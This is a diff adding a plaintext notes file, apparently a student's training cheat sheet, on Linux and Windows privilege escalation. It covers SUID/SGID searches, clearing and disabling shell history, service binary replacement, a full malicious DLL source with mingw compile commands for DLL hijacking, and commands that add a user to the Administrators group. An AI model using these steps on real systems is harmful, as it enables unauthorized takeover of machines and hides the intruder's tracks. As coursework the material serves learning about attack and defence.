@@ -1,0 +1,155 @@
+sudo -l
+#use gtfo bins to look up whats in there to escalate
+
+
+#suid
+find / -type f -perm /4000 -ls 2>/dev/null
+
+#sgid
+find / -type f -perm /2000 -ls 2>/dev/null
+
+#both
+find / -type f -perm /6000 -ls 2>/dev/null
+
+#use gtfo bins to look up suspicious things
+
+
+#not logging commands
+cat .bash_history
+unset HISTFILE
+echo "" ? .bash_history
+
+#logs
+cd /var/log
+cat lastlog
+sudo cat btmp
+
+--Windows Privlege Escalation
+1) Services
+Open via Task Manager or Services
+-Startup Type : Automatic
+-Log on as : local system
+SYSTEM > administrator > user
+-description : <Blank description>
+
+-Path to executable:
+  C:\Program Files\TightVNC\tvnserver.exe
+  
+  -Determine if directory is writable
+Right-clicking inside the directory to see if you can create things
+
+ - note the permissions
+  # if you can write to it then its Binary Replacement
+  # if you can NOT then its DLL hijacking
+  
+--Binary Replacement
+  1) Look at path to executable to determine the file name that we are going to replace
+  tvnserver.exe <== we will need to rename our malicious binary to tvnserver.exe to match what is called upon in the path to executable, then rename the original
+  
+  2) Getting our binary on the machine
+  -SCP
+  scp <src> <dst>
+   #rename binary to the .exe, rename the .exe to something else
+   
+  -Python Server
+  student@lin-ops:~$ python3 -m http.server
+  
+  {on windows target} open up browser > http://<ip of linops>:8000
+  
+  3) Getting the malicious binary to execute
+  Restart the machine *may need to do multiple times*
+
+
+--DLL Hijacking (DLL search order)
+
+  [cmd] net use * \\live.sysinternals.com\tools
+  [cmd] Z:
+  [cmd] procmon.exe -accepteula
+  
+  Filters > Process Name | contains | putty | include
+            Result | contains | NOT | include
+            Path | contains | .dll | include 
+  
+  run the .exe
+  
+  google vulnerabilities / dll
+  
+  craft our DLL:
+  sudo apt-get install mingw-w64 mingw-w64-common mingw-w64-tools mingw-w64-x86-64-dev -y
+  
+  vim SSPICLI.c
+
+  ########## SSPICLI.c ########## 
+  #include <windows.h>
+  int execCommand()
+  {
+   WinExec("cmd /C whoami > FINDME_1.txt", 1);
+   return 0;
+  }
+  BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
+  {
+   execCommand();
+   return 0;
+  }
+  ########## SSPICLI.c ########## 
+  
+  #Compile the raw C source code into a unlinked c object
+  i686-w64-mingw32-gcc -c SSPICLI.c -o SSPICLI.o
+
+  #Create the DLL from unlinked c object
+  i686-w64-mingw32-gcc -shared -o SSPICLI.dll SSPICLI.o -Wl,--out-implib,SSPICLI.a
+
+  copy to the created file
+  
+  restart machine
+
+Commands to escalate our privileges:
+-Add a new user, join them to admin group and remote desktop group
+--> net user <username> <password> /add
+--> net localgroup Administrators <username> /add
+
+-add existing user to admin group and remote desktop group 
+  
+  
+  
+2) Schedule Tasks
+
+Task schefuler
+General Tab > Security Options  > SYSTEM
+Triggers Tab > Trigger/Details: Desireable (At logon, At startup, At log on of any user) , status: Enabled
+Action Tab > Action: Start a program, Details: <writeable directories!>
+
+
+--Binary Replacement
+#if you can manipulate the binary then use this
+--DLL Hijacking
+#if you can't then use this
+
+#Refrence back to complete this step
+
+
+3) Event Log
+--Requires elevated privileges to look at certaun logs (Security)
+
+ --Auditpol (Security policies)
+--Requires elevated privileges
+
+ #need an administrator shell
+ [cmd] auditpol /get /category:*
+ 
+ Local security policy  #in search bar
+ #actual configuration of everything 
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
